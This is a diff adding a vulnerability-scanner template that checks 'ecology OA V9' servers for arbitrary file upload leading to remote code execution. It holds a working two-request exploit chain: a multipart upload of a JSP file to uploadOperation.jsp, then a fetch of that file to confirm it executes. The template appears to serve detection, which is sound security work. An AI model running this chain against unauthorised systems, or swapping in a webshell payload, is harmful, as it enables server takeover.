@@ -1,0 +1,39 @@
+id: ecology-v9-fileUpload
+info:
+  name: ecology OA V9 RCE via File Upload
+  author:
+  - l0ne1y
+  description: |-
+    ecology v9 Arbitrary File Upload
+    Web programs often contain file upload features, such as avatar uploads, image uploads, and attachment uploads. Since web middleware executes files with specific extensions (asp, php, cgi, aspx, jsp, etc.) based on user requests, if the file upload functionality does not restrict uploaded file extensions and allows executable files with extensions such as "asp, php, cgi, aspx, jsp, html" to be uploaded, attackers can exploit this vulnerability to upload malicious executable files to run malicious code, such as file read/write and command execution, thereby directly taking control of the server; for example, attackers can upload a malicious backdoor to obtain a webshell.
+  severity: high
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - contains(body_2, "{{randomValue}}")
+    - status_code_2 == 200
+  raw:
+  - |
+    POST /page/exportImport/uploadOperation.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Origin: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+
+    ------WebKitFormBoundaryFy3iNVBftjP6IOwo
+    Content-Disposition: form-data; name="file"; filename="{{fileName}}.jsp"
+    Content-Type: application/octet-stream
+
+    <%out.print({{randomValue}});%>
+    ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
+  - |
+    GET /page/exportImport/fileTransfer/{{fileName}}.jsp HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
+variables:
+  fileName: '{{rand_base(5, "qwertyuiopasdfghjkl")}}'
+  randomValue: '{{rand_int(200000000, 210000000)}}'
